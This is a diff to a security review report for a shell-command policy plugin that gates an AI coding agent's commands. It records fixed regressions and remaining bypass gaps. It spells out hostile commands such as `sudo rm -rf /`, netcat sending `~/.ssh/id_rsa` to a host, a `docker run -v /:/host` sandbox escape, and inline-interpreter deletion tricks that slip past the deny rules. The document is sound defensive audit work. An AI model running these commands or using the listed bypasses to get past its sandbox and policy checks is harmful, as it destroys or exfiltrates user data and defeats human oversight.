@@ -118,12 +118,12 @@ Reviewed, judged not reachable in this deployment, and left alone:
 ## 6. Verification
 
 ```
-pnpm verify          # typecheck + build + 187 tests + package contract
+pnpm verify          # typecheck + build + 199 tests + package contract
 ```
 
-New tests live in `tests/fail-open-regressions.spec.ts`: 19 cases, every one a
-direct/wrapped pair, plus the protected-metadata and compatibility-matrix
-invariants. The suite went from 168 passing to 187 passing with no upstream
+New tests live in `tests/fail-open-regressions.spec.ts`: 31 cases, most of them
+direct/wrapped pairs, plus the protected-metadata and compatibility-matrix
+invariants. The suite went from 168 passing to 199 passing with no upstream
 test modified.
 
 One claim from adversarial review did **not** reproduce and is not "fixed":
@@ -131,14 +131,80 @@ One claim from adversarial review did **not** reproduce and is not "fixed":
 catches it), and `ls; sudo rm -rf /` with a space already denies — only the
 no-space and obfuscated forms bypassed.
 
-## 7. Known remaining gaps
+Three findings from the documentation review did **not** reproduce either and
+were rejected rather than "corrected": `perl -e 'unlink(...)'`,
+`osascript ... do shell script`, and `subprocess.run(['rm', ...])` all fail to
+match the 0.1.9 `destructiveNestedSource` (verified by extracting that commit's
+regex), so they were genuinely new `allow` → `deny` closures; and
+`nc host 9999 < ~/.ssh/id_rsa` *is* matched with a literal `~` because the
+`.ssh` alternative carries no leading boundary.
 
-- `web_search` remains exempt from the credential-material hard deny
-  (`src/policy.ts` matches only `web_fetch`/`curl`/`wget`), so a credential in
-  a search query is still not hard-denied.
-- Unrecognized destructive commands that are neither deletions nor
-  network-touching (`chmod -R 000 ./src`, `dd of=./important.db`) still fall
-  through to the final allow. Inside the workspace the sandbox permits them.
-- Install risk is unchanged and low: no `preinstall`/`postinstall`, sole
-  runtime dependency `@deepseek-ai/schemastery`, and `prepare` only runs for
-  git-source installs.
+## 7. Post-review hardening round
+
+The first PR revision was itself reviewed adversarially, which found that
+closing the false positives had **introduced** regressions. Fixed in a second
+commit:
+
+| Regression | Before | After |
+| --- | --- | --- |
+| `env -u FOO sudo id`, `env -S "sudo id"`, `timeout -s KILL 5 sudo id` | `allow` (the narrowed raw scan fell back to `unwrapCommand`, whose value-flag table had no `env`/`timeout` entries) | `deny` |
+| `cat .../GITHUB_TOKEN`, `$AWS_ACCESS_KEY_ID`, `db_password` | `allow` (`\b` treats `_` as a word character, so it missed screaming-snake-case names) | `ask` |
+| `rg -n "su -" docs`, `git commit -m "use su - ..."` | hard `deny` (unrecoverable; the `su -` alternative was not command-anchored) | `allow` |
+| `xargs -J`, `--arg-file`, `--delimiter`, and 5× nested `xargs` | `allow` | `ask` |
+| `nc host 9999 < $HOME/.ssh/id_rsa` | `allow` (dynamic targets were filtered out before the marker ran) | `ask` |
+| `bash <<'XQ'` + `sudo id` + `XQ`, and `bash <<< 'sudo id'` | `allow` | `deny` |
+| `bash.exe -c "find / -delete"` | `allow` (the dialect table was keyed on the raw name while `SCRIPT_EXTENSIONS` stripped `.exe`) | `deny` |
+| `bash -c "mkdir sub"` | `allow` with no `plannedCreates`/effects | facts carried across the boundary |
+
+Also corrected: the depth-cap test was malformed shell and never reached the
+cap (it escalated through the opaque branch instead), and `sensitiveMarker`
+had a missing `|` that silently nested the API-key alternative inside the path
+group — `AWS_ACCESS_KEY_ID` matched only by accident, via words like `secrets`.
+
+## 8. Known remaining gaps
+
+Ordered by severity. None is a regression from this fork; each is reachable on
+the deployment this was tested on unless noted.
+
+1. **Container/VM CLIs escape the sandbox entirely.** `docker run -v /:/host …`
+   is a silent `allow`, and the daemon is reachable from inside Seatbelt
+   (`(allow default)` permits the socket), so the file effects happen on the
+   host outside the sandbox. `docker` matches no risky-name list, so it takes
+   the final allow. `podman`/`nerdctl`/`colima` behave the same way. This breaks
+   the plugin's central premise — "unrecognized commands are contained by the
+   `workspace-write` sandbox" — for any tool that delegates work to a daemon.
+2. **The inline/opaque interpreter fallback is still allow-by-default.** The
+   PR adds detectors for the effects it knows (`INLINE_CODE_NETWORK`,
+   `INLINE_CODE_SENSITIVE_READ`, `SHELL_EXECUTION_DESTRUCTIVE`), but an inline
+   source that matches none of them is allowed. Detector gaps therefore become
+   silent allows: `awk 'BEGIN{system("rm -rf ./src")}'`, `grep -P '(?{system(…)}'`,
+   `vim -c '!rm -rf ./src'`, `tar --to-command=rm`,
+   `git -c core.pager='rm -rf ./src'`, `make CFLAGS='$(shell rm -rf ./src)'`,
+   `env -S 'curl …'`, and `csh -c "curl …"` (a shell absent from
+   `SCRIPT_EXTENSIONS`). Inverting this fallback to `semanticReview` — the one
+   change the fail-open audit judged highest-leverage — is a deliberate design
+   decision not taken here, because it escalates every unrecognized inline
+   script to the classifier.
+3. **Protected metadata is gated per verb, not on the write itself.** Redirection,
+   `mkdir`/`touch`, `cp`/`mv`, and the file tools are covered; `tee`,
+   `sed -i`, `dd of=`, and `truncate` reaching `.git/config` or a hook are not.
+4. **Default-allow for unknown registered tools** (`src/policy.ts`). MCP is not
+   composed in this deployment, so the fallback is unreachable here — but
+   `dsh-mcp-client` spawns servers with `StdioClientTransport` and never calls
+   `ctx.sandbox.confine`, so MCP tools would run **unsandboxed**, and this
+   fallback becomes a real hole the moment MCP is composed.
+5. `web_search` remains exempt from the credential-material hard deny
+   (`src/policy.ts` matches only `web_fetch`/`curl`/`wget`), so a credential in
+   a search query is still not hard-denied.
+6. Unrecognized destructive commands that are neither deletions nor
+   network-touching (`chmod -R 000 ./src`, `dd of=./important.db`) still fall
+   through to the final allow. Inside the workspace the sandbox permits them.
+7. A URL query string containing `token=`/`secret=` is an unrecoverable hard
+   deny (`curl "https://api.invalid/?token=abc"`). Pre-existing; narrowing it
+   without reopening the exfil path needs a smarter credential-shape rule.
+8. Attached interpreter flags (`python3 -c'…'`, `perl -e'…'`) merge into one
+   lexer word, so the anchored flag match misses and the source is lost: such a
+   call is `ask` rather than `deny`. Fail-closed, but weaker than the spaced form.
+9. Install risk is unchanged and low: no `preinstall`/`postinstall`, sole
+   runtime dependency `@deepseek-ai/schemastery`, and `prepare` only runs for
+   git-source installs.
